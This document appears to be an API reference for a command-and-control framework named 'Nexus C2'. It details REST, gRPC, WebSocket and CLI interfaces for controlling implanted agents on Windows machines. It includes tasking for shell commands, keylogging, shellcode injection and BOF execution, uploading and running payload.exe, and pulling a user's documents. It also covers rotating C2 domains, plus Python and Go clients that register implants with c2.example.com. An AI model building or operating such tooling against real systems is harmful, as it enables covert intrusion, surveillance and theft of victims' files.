# Interactive API Reference

Complete reference for all interactive APIs in the Nexus C2 framework, including REST endpoints, gRPC services, and command-line interfaces.

## Overview

The Nexus framework provides multiple API layers for different interaction patterns:
- **REST API** - HTTP-based web service endpoints for UI integration
- **gRPC API** - High-performance binary protocol for agent communication
- **WebSocket API** - Real-time bidirectional communication
- **Command Line Interface** - Direct server and infrastructure management
- **Administrative APIs** - System configuration and monitoring

## Authentication

### API Authentication

All APIs use token-based authentication:

```http
Authorization: Bearer <token>
```

### Token Management

```bash
# Generate API token
nexus-server auth generate-token --user admin --expiry 24h

# Validate token
nexus-server auth validate-token <token>

# Revoke token
nexus-server auth revoke-token <token>
```

## REST API Endpoints

### Agent Management

#### List Agents

```http
GET /api/agents
```

**Response:**
```json
{
    "agents": [
        {
            "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
            "hostname": "WIN-DESKTOP-01",
            "platform": "windows",
            "ip_address": "192.168.1.100",
            "connected_at": "2024-01-15T10:30:15Z",
            "last_seen": "2024-01-15T11:45:22Z",
            "status": "active",
            "capabilities": ["shell", "file_ops", "bof_execution"]
        }
    ],
    "total": 15,
    "active": 12
}
```

#### Get Agent Details

```http
GET /api/agents/{agent_id}
```

**Response:**
```json
{
    "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
    "hostname": "WIN-DESKTOP-01",
    "platform": "windows",
    "os_version": "Windows 11 Pro",
    "architecture": "x64",
    "ip_address": "192.168.1.100",
    "username": "alice.smith",
    "process_id": 1234,
    "process_name": "svchost.exe",
    "connected_at": "2024-01-15T10:30:15Z",
    "last_seen": "2024-01-15T11:45:22Z",
    "status": "active",
    "capabilities": ["shell", "file_ops", "bof_execution"],
    "pending_tasks": [
        {
            "task_id": "task-001",
            "task_type": "shell",
            "command": "whoami",
            "status": "running",
            "progress": 80
        }
    ],
    "completed_tasks": 42
}
```

#### Execute Task on Agent

```http
POST /api/agents/{agent_id}/tasks
```

**Request Body:**
```json
{
    "task_type": "shell",
    "command": "whoami /all",
    "parameters": {
        "output_format": "json",
        "timeout": 30
    },
    "priority": 100,
    "max_retries": 3
}
```

**Response:**
```json
{
    "task_id": "task-123",
    "status": "queued",
    "created_at": "2024-01-15T11:45:30Z",
    "estimated_completion": "2024-01-15T11:45:45Z"
}
```

#### Kill Agent

```http
DELETE /api/agents/{agent_id}
```

**Response:**
```json
{
    "success": true,
    "message": "Agent terminated successfully"
}
```

### Task Management

#### Get Task Status

```http
GET /api/tasks/{task_id}
```

**Response:**
```json
{
    "task_id": "task-123",
    "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
    "task_type": "shell",
    "command": "whoami /all",
    "status": "completed",
    "progress": 100,
    "created_at": "2024-01-15T11:45:30Z",
    "started_at": "2024-01-15T11:45:32Z",
    "completed_at": "2024-01-15T11:45:35Z",
    "output": "DESKTOP-01\\alice\nUser Name: alice.smith\n...",
    "success": true,
    "execution_time": 3.2
}
```

#### List Tasks

```http
GET /api/tasks?status=completed&agent_id={agent_id}&limit=50
```

**Query Parameters:**
- `status` - Filter by task status (`pending`, `running`, `completed`, `failed`)
- `agent_id` - Filter by specific agent
- `task_type` - Filter by task type
- `limit` - Maximum number of results (default: 50)
- `offset` - Pagination offset

**Response:**
```json
{
    "tasks": [
        {
            "task_id": "task-123",
            "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
            "task_type": "shell",
            "status": "completed",
            "created_at": "2024-01-15T11:45:30Z",
            "completed_at": "2024-01-15T11:45:35Z"
        }
    ],
    "total": 157,
    "has_more": true
}
```

#### Cancel Task

```http
DELETE /api/tasks/{task_id}
```

**Response:**
```json
{
    "success": true,
    "message": "Task cancelled successfully"
}
```

### File Management

#### Upload File to Agent

```http
POST /api/agents/{agent_id}/files/upload
Content-Type: multipart/form-data
```

**Form Data:**
- `file` - File to upload
- `destination_path` - Target path on agent
- `overwrite` - Boolean, overwrite existing files
- `execute` - Boolean, execute after upload

**Response:**
```json
{
    "transfer_id": "transfer-456",
    "filename": "payload.exe",
    "file_size": 2097152,
    "destination_path": "C:\\Users\\alice\\Desktop\\payload.exe",
    "status": "started",
    "estimated_completion": "2024-01-15T11:47:00Z"
}
```

#### Download File from Agent

```http
POST /api/agents/{agent_id}/files/download
```

**Request Body:**
```json
{
    "file_path": "C:\\Users\\alice\\Documents\\important.docx"
}
```

**Response:**
```json
{
    "transfer_id": "transfer-789",
    "filename": "important.docx",
    "file_size": 2621440,
    "source_path": "C:\\Users\\alice\\Documents\\important.docx",
    "status": "started"
}
```

#### Get File Transfer Status

```http
GET /api/transfers/{transfer_id}
```

**Response:**
```json
{
    "transfer_id": "transfer-456",
    "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
    "filename": "payload.exe",
    "file_size": 2097152,
    "bytes_transferred": 1677721,
    "progress": 80,
    "transfer_rate": 245760,
    "eta_seconds": 2,
    "status": "transferring",
    "started_at": "2024-01-15T11:46:30Z"
}
```

### Infrastructure Management

#### Get Domain Status

```http
GET /api/domains
```

**Response:**
```json
{
    "domains": [
        {
            "domain": "c2.example.com",
            "status": "active",
            "type": "primary",
            "ip_address": "203.0.113.10",
            "health_score": 98.5,
            "last_check": "2024-01-15T11:45:00Z",
            "ssl_valid": true,
            "ssl_expires": "2024-03-15T00:00:00Z"
        }
    ],
    "next_rotation": "2024-01-16T10:30:15Z",
    "rotation_interval": 24
}
```

#### Rotate Domain

```http
POST /api/domains/rotate
```

**Request Body:**
```json
{
    "immediate": true,
    "reason": "manual_rotation"
}
```

**Response:**
```json
{
    "success": true,
    "old_domain": "c2.example.com",
    "new_domain": "backup.example.com",
    "rotation_time": "2024-01-15T11:50:00Z",
    "propagation_eta": 300
}
```

#### Get Certificates

```http
GET /api/certificates
```

**Response:**
```json
{
    "certificates": [
        {
            "domain": "c2.example.com",
            "type": "lets_encrypt",
            "issued_at": "2024-01-15T00:00:00Z",
            "expires_at": "2024-04-15T00:00:00Z",
            "days_remaining": 89,
            "status": "valid",
            "auto_renew": true
        }
    ]
}
```

### System Information

#### Get System Status

```http
GET /api/system
```

**Response:**
```json
{
    "server": {
        "version": "1.0.0",
        "uptime": 86400,
        "cpu_usage": 15.2,
        "memory_usage": 2684354560,
        "memory_total": 8589934592,
        "disk_usage": 45.6
    },
    "agents": {
        "total": 15,
        "active": 12,
        "inactive": 3
    },
    "tasks": {
        "pending": 8,
        "running": 5,
        "completed": 157,
        "failed": 3
    },
    "infrastructure": {
        "domains_active": 3,
        "certificates_valid": 2,
        "ssl_health": 100
    }
}
```

#### Get Performance Metrics

```http
GET /api/system/metrics?period=1h&interval=5m
```

**Query Parameters:**
- `period` - Time period (`1h`, `6h`, `24h`, `7d`)
- `interval` - Data point interval (`1m`, `5m`, `15m`, `1h`)

**Response:**
```json
{
    "period": "1h",
    "interval": "5m",
    "metrics": [
        {
            "timestamp": "2024-01-15T11:40:00Z",
            "cpu_usage": 14.5,
            "memory_usage": 2651746304,
            "network_in": 1024000,
            "network_out": 2048000,
            "active_connections": 15,
            "task_queue_size": 8
        }
    ]
}
```

## gRPC API Reference

### Service Definition

```protobuf
service NexusC2 {
    // Agent Management
    rpc RegisterAgent(RegistrationRequest) returns (RegistrationResponse);
    rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
    rpc GetAgentInfo(AgentInfoRequest) returns (AgentInfoResponse);
    
    // Task Management
    rpc GetTasks(TaskRequest) returns (stream Task);
    rpc SubmitTaskResult(TaskResult) returns (TaskResultResponse);
    
    // File Operations
    rpc UploadFile(stream FileChunk) returns (FileUploadResponse);
    rpc DownloadFile(FileDownloadRequest) returns (stream FileChunk);
    
    // Execution Services
    rpc ExecuteShellcode(ShellcodeRequest) returns (ShellcodeResponse);
    rpc ExecuteBOF(BofRequest) returns (BofResponse);
}
```

### Message Types

#### RegistrationRequest

```protobuf
message RegistrationRequest {
    string hostname = 1;
    string os_type = 2;
    string os_version = 3;
    string ip_address = 4;
    string username = 5;
    uint32 process_id = 6;
    string process_name = 7;
    string architecture = 8;
    repeated string capabilities = 9;
    string public_key = 10;
}
```

#### Task

```protobuf
message Task {
    string task_id = 1;
    TaskType task_type = 2;
    string command = 3;
    map<string, string> parameters = 4;
    google.protobuf.Timestamp created_at = 5;
    google.protobuf.Timestamp scheduled_for = 6;
    uint32 timeout_seconds = 7;
    uint32 priority = 8;
    uint32 max_retries = 9;
}

enum TaskType {
    UNSPECIFIED = 0;
    SHELL_COMMAND = 1;
    FILE_DOWNLOAD = 2;
    FILE_UPLOAD = 3;
    SCREENSHOT = 4;
    KEYLOGGER = 5;
    BOF_EXECUTION = 6;
    SHELLCODE_INJECTION = 7;
    PROCESS_LIST = 8;
    REGISTRY_QUERY = 9;
    SERVICE_CONTROL = 10;
}
```

#### TaskResult

```protobuf
message TaskResult {
    string task_id = 1;
    string agent_id = 2;
    TaskStatus status = 3;
    string output = 4;
    string error = 5;
    google.protobuf.Timestamp completed_at = 6;
    double execution_time = 7;
    uint32 exit_code = 8;
}

enum TaskStatus {
    TASK_UNSPECIFIED = 0;
    TASK_PENDING = 1;
    TASK_RUNNING = 2;
    TASK_COMPLETED = 3;
    TASK_FAILED = 4;
    TASK_TIMEOUT = 5;
    TASK_CANCELLED = 6;
}
```

### gRPC Client Examples

#### Python Client

```python
import grpc
import nexus_pb2
import nexus_pb2_grpc
from datetime import datetime

class NexusClient:
    def __init__(self, server_address, cert_file, key_file):
        # Load TLS credentials
        credentials = grpc.ssl_channel_credentials(
            root_certificates=open(cert_file, 'rb').read(),
            private_key=open(key_file, 'rb').read()
        )
        
        # Create channel
        self.channel = grpc.secure_channel(server_address, credentials)
        self.stub = nexus_pb2_grpc.NexusC2Stub(self.channel)
    
    def register_agent(self, agent_info):
        request = nexus_pb2.RegistrationRequest(
            hostname=agent_info['hostname'],
            os_type=agent_info['os_type'],
            os_version=agent_info['os_version'],
            ip_address=agent_info['ip_address'],
            username=agent_info['username'],
            process_id=agent_info['process_id'],
            process_name=agent_info['process_name'],
            architecture=agent_info['architecture'],
            capabilities=agent_info['capabilities'],
            public_key=agent_info['public_key']
        )
        
        response = self.stub.RegisterAgent(request)
        return response
    
    def get_tasks(self, agent_id, max_tasks=10):
        request = nexus_pb2.TaskRequest(
            agent_id=agent_id,
            max_tasks=max_tasks
        )
        
        tasks = []
        for task in self.stub.GetTasks(request):
            tasks.append(task)
        
        return tasks
    
    def submit_task_result(self, task_result):
        response = self.stub.SubmitTaskResult(task_result)
        return response

# Usage
client = NexusClient('c2.example.com:443', 'ca.crt', 'client.key')

# Register agent
agent_info = {
    'hostname': 'WIN-DESKTOP-01',
    'os_type': 'Windows',
    'os_version': '11 Pro',
    'ip_address': '192.168.1.100',
    'username': 'alice',
    'process_id': 1234,
    'process_name': 'svchost.exe',
    'architecture': 'x64',
    'capabilities': ['shell', 'file_ops'],
    'public_key': 'public_key_data'
}

registration = client.register_agent(agent_info)
print(f"Registered with agent ID: {registration.agent_id}")
```

#### Go Client

```go
package main

import (
    "context"
    "crypto/tls"
    "log"
    
    "google.golang.org/grpc"
    "google.golang.org/grpc/credentials"
    pb "your-module/nexus"
)

type NexusClient struct {
    conn   *grpc.ClientConn
    client pb.NexusC2Client
}

func NewNexusClient(address, certFile, keyFile string) (*NexusClient, error) {
    cert, err := tls.LoadX509KeyPair(certFile, keyFile)
    if err != nil {
        return nil, err
    }
    
    config := &tls.Config{
        Certificates: []tls.Certificate{cert},
    }
    
    creds := credentials.NewTLS(config)
    conn, err := grpc.Dial(address, grpc.WithTransportCredentials(creds))
    if err != nil {
        return nil, err
    }
    
    client := pb.NewNexusC2Client(conn)
    
    return &NexusClient{
        conn:   conn,
        client: client,
    }, nil
}

func (c *NexusClient) RegisterAgent(ctx context.Context, req *pb.RegistrationRequest) (*pb.RegistrationResponse, error) {
    return c.client.RegisterAgent(ctx, req)
}

func (c *NexusClient) GetTasks(ctx context.Context, agentID string, maxTasks uint32) ([]*pb.Task, error) {
    req := &pb.TaskRequest{
        AgentId:  agentID,
        MaxTasks: maxTasks,
    }
    
    stream, err := c.client.GetTasks(ctx, req)
    if err != nil {
        return nil, err
    }
    
    var tasks []*pb.Task
    for {
        task, err := stream.Recv()
        if err != nil {
            break
        }
        tasks = append(tasks, task)
    }
    
    return tasks, nil
}

func main() {
    client, err := NewNexusClient(
        "c2.example.com:443",
        "client.crt",
        "client.key",
    )
    if err != nil {
        log.Fatal(err)
    }
    defer client.conn.Close()
    
    // Register agent
    req := &pb.RegistrationRequest{
        Hostname:     "WIN-DESKTOP-01",
        OsType:       "Windows",
        OsVersion:    "11 Pro",
        IpAddress:    "192.168.1.100",
        Username:     "alice",
        ProcessId:    1234,
        ProcessName:  "svchost.exe",
        Architecture: "x64",
        Capabilities: []string{"shell", "file_ops"},
        PublicKey:    "public_key_data",
    }
    
    resp, err := client.RegisterAgent(context.Background(), req)
    if err != nil {
        log.Fatal(err)
    }
    
    log.Printf("Registered with agent ID: %s", resp.AgentId)
}
```

## Command Line Interface

### Server Management Commands

#### Server Control

```bash
# Start server
nexus-server start --config nexus.toml --daemon

# Stop server
nexus-server stop

# Restart server
nexus-server restart

# Get server status
nexus-server status

# Validate configuration
nexus-server validate --config nexus.toml
```

#### Infrastructure Commands

```bash
# Initialize infrastructure
nexus-server init --config nexus.toml --force

# Domain management
nexus-server domains list
nexus-server domains rotate --immediate
nexus-server domains health

# Certificate management  
nexus-server certificates list
nexus-server certificates renew --all
nexus-server certificates status
```

### Agent Management Commands

#### List and Monitor Agents

```bash
# List all agents
nexus-cli agents list

# Get agent details
nexus-cli agents show <agent_id>

# Monitor agent activity
nexus-cli agents monitor <agent_id>

# Kill agent
nexus-cli agents kill <agent_id>
```

#### Task Management

```bash
# Execute command on agent
nexus-cli exec <agent_id> "whoami"

# Execute BOF on agent
nexus-cli bof-exec <agent_id> whoami.obj go

# List tasks
nexus-cli tasks list --agent <agent_id> --status completed

# Get task results
nexus-cli tasks show <task_id>

# Cancel task
nexus-cli tasks cancel <task_id>
```

#### File Operations

```bash
# Upload file to agent
nexus-cli files upload <agent_id> local_file.exe C:\Windows\Temp\

# Download file from agent
nexus-cli files download <agent_id> "C:\Users\alice\Documents\file.txt"

# List files on agent
nexus-cli files list <agent_id> "C:\Users\alice\"
```

### Administrative Commands

#### User Management

```bash
# Create user
nexus-server users create --username admin --password secret --role administrator

# List users
nexus-server users list

# Delete user
nexus-server users delete --username admin

# Reset password
nexus-server users password --username admin --password new_secret
```

#### System Monitoring

```bash
# System status
nexus-server system status

# Performance metrics
nexus-server system metrics --period 1h

# Log analysis
nexus-server logs tail --lines 100
nexus-server logs search --query "error" --since 1h

# Health check
nexus-server health check
```

### Configuration Management

```bash
# Get configuration value
nexus-server config get grpc_server.port

# Set configuration value
nexus-server config set grpc_server.max_connections 2000

# Reload configuration
nexus-server config reload

# Export configuration
nexus-server config export --output backup.toml

# Import configuration
nexus-server config import --input backup.toml
```

## WebSocket API Reference

### Connection Endpoint

```
wss://your-nexus-server:8080/ws
```

### Message Format

All WebSocket messages use JSON format:

```json
{
    "type": "message_type",
    "data": { /* message-specific data */ },
    "timestamp": "2024-01-15T11:45:30Z",
    "id": "msg-123"
}
```

### Client Messages

#### Subscribe to Events

```json
{
    "type": "subscribe",
    "events": ["agent_updates", "task_progress"],
    "filters": {
        "platform": "windows",
        "status": "active"
    }
}
```

#### Unsubscribe from Events

```json
{
    "type": "unsubscribe",
    "events": ["agent_updates"]
}
```

#### Ping/Heartbeat

```json
{
    "type": "ping",
    "timestamp": 1705319130000
}
```

### Server Messages

#### Agent Events

```json
{
    "type": "AgentConnected",
    "data": {
        "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
        "hostname": "WIN-DESKTOP-01",
        "platform": "windows",
        "ip_address": "192.168.1.100",
        "connected_at": "2024-01-15T11:45:30Z",
        "capabilities": ["shell", "file_ops"]
    }
}
```

#### Task Events

```json
{
    "type": "TaskProgress",
    "data": {
        "task_id": "task-123",
        "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
        "progress": 75,
        "status_message": "Executing command",
        "updated_at": "2024-01-15T11:45:35Z"
    }
}
```

#### System Events

```json
{
    "type": "SystemAlert",
    "data": {
        "alert_id": "alert-456",
        "severity": "warning",
        "category": "infrastructure",
        "title": "Certificate Expiring Soon",
        "description": "Certificate for c2.example.com expires in 7 days",
        "timestamp": "2024-01-15T11:45:40Z"
    }
}
```

## Error Handling

### HTTP Error Responses

```json
{
    "error": {
        "code": "AGENT_NOT_FOUND",
        "message": "Agent with ID a1b2c3d4 not found",
        "details": {
            "agent_id": "a1b2c3d4-5678-9012-3456-789012345678",
            "timestamp": "2024-01-15T11:45:30Z"
        }
    }
}
```

### Common Error Codes

| Code | HTTP Status | Description |
|------|-------------|-------------|
| `INVALID_REQUEST` | 400 | Request validation failed |
| `AUTHENTICATION_FAILED` | 401 | Invalid or expired token |
| `INSUFFICIENT_PERMISSIONS` | 403 | Operation not permitted |
| `AGENT_NOT_FOUND` | 404 | Agent does not exist |
| `TASK_NOT_FOUND` | 404 | Task does not exist |
| `AGENT_OFFLINE` | 409 | Agent is not responding |
| `TASK_TIMEOUT` | 408 | Task execution timeout |
| `INTERNAL_ERROR` | 500 | Server internal error |
| `SERVICE_UNAVAILABLE` | 503 | Service temporarily unavailable |

### gRPC Error Codes

| Code | Description |
|------|-------------|
| `OK` | Success |
| `INVALID_ARGUMENT` | Invalid request parameters |
| `NOT_FOUND` | Resource not found |
| `PERMISSION_DENIED` | Insufficient permissions |
| `UNAUTHENTICATED` | Authentication required |
| `UNAVAILABLE` | Service unavailable |
| `INTERNAL` | Internal server error |

## Rate Limits

### REST API Rate Limits

| Endpoint | Rate Limit |
|----------|------------|
| `/api/agents` | 100 requests/minute |
| `/api/agents/{id}/tasks` | 20 requests/minute |
| `/api/files/*` | 10 requests/minute |
| `/api/system/metrics` | 60 requests/minute |

### gRPC Rate Limits

| Method | Rate Limit |
|--------|------------|
| `RegisterAgent` | 10 calls/minute |
| `Heartbeat` | 120 calls/minute |
| `GetTasks` | 60 calls/minute |
| `SubmitTaskResult` | 100 calls/minute |

## API Versioning

### Version Header

Include API version in requests:

```http
X-API-Version: v1
```

### Supported Versions

- `v1` - Current stable version
- `v1beta` - Beta features (not recommended for production)

## SDK and Client Libraries

### Official SDKs

- **Python SDK** - `pip install nexus-c2-sdk`
- **Go SDK** - `go get github.com/nexus-c2/go-sdk`
- **JavaScript SDK** - `npm install nexus-c2-js`

### Example SDK Usage

```python
from nexus_c2_sdk import NexusClient

# Initialize client
client = NexusClient(
    base_url='https://c2.example.com',
    token='your-api-token'
)

# List agents
agents = client.agents.list()

# Execute task
task = client.agents.execute_task(
    agent_id='a1b2c3d4-5678-9012-3456-789012345678',
    command='whoami',
    task_type='shell'
)

# Monitor task progress
for update in client.tasks.monitor(task.id):
    print(f"Progress: {update.progress}%")
    if update.status == 'completed':
        print(f"Output: {update.output}")
        break
```

This comprehensive API reference covers all interactive interfaces available in the Nexus C2 framework, providing developers with the information needed to build applications and integrations with the platform.
